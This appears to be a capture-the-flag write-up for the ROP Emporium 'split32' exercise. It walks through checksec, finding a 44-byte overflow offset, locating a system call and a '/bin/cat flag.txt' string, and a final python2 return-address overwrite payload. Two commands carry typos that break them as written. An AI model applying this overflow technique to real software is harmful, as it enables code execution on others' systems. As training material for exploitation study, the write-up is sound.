# Basic Test:

## Check call system into binary file
```bash
strace ./split32
```

## Check protection into binary file
```bash
checksec ./split32
```

    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

<br>

# Exploitation:

## Clear the kernel ring buffer
```bash
sudo dmesg -C
```

## Find offset for overwrite RIP
```bash
python2 -c 'print "A"*44 + "B"*4*' | ./split32
```

## See output
```bash
sudo dmesg -T
```

	[dim. avril  9 00:32:30 2023] split32[125597]: segfault at 42424242 ip 0000000042424242 sp 00000000ff8b9de0 error 14 in libc.so.6[f7c00000+22000] likely on CPU 0 (core 0, socket 0)

## Find the address of the paramater
```bash
rabin2 -z ./split32
```

	nth paddr      vaddr      len size section type  string
	―――――――――――――――――――――――――――――――――――――――――――――――――――――――
	0   0x000006b0 0x080486b0 21  22   .rodata ascii split by ROP Emporium
	1   0x000006c6 0x080486c6 4   5    .rodata ascii x86\n
	2   0x000006cb 0x080486cb 8   9    .rodata ascii \nExiting
	3   0x000006d4 0x080486d4 43  44   .rodata ascii Contriving a reason to ask user for data...
	4   0x00000703 0x08048703 10  11   .rodata ascii Thank you!
	5   0x0000070e 0x0804870e 7   8    .rodata ascii /bin/ls
	0   0x00001030 0x0804a030 17  18   .data   ascii /bin/cat flag.txt

## Find the address of the call system
```bash
pwngdb> disass*usefulFunction
```

	   0x0804860c <+0>:     push   ebp
	   0x0804860d <+1>:     mov    ebp,esp
	   0x0804860f <+3>:     sub    esp,0x8
	   0x08048612 <+6>:     sub    esp,0xc
	   0x08048615 <+9>:     push   0x804870e
	   0x0804861a <+14>:    call   0x80483e0 <system@plt>
	   0x0804861f <+19>:    add    esp,0x10
	   0x08048622 <+22>:    nop
	   0x08048623 <+23>:    leave
	   0x08048624 <+24>:    ret

## Payload final CLI

```bash
python2 -c 'print "A"*44 + "\x1a\x86\x04\x08" + "\x30\xa0\x04\x08"' | ./split32 # call system = 0x0804861a + /bin/cat flag.txt = 0x0804a030
```